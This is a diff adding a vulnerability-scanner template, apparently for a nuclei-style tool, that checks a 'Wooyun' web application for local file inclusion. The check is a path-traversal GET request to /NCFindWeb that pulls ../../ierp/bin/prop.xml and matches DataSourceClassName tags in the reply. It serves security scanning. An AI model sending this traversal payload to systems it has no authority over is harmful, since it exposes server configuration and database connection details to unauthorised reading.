@@ -1,0 +1,22 @@
+id: wooyun-path-traversal
+name: Wooyun - Local File Inclusion
+severity: high
+confidence: tentative
+description: Wooyun is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- lfi
+- wooyun
+- vuln
+requests:
+- method: GET
+  path: /NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: body
+    words:
+    - <DataSourceClassName>
+    - </DataSourceClassName>
+  condition: and
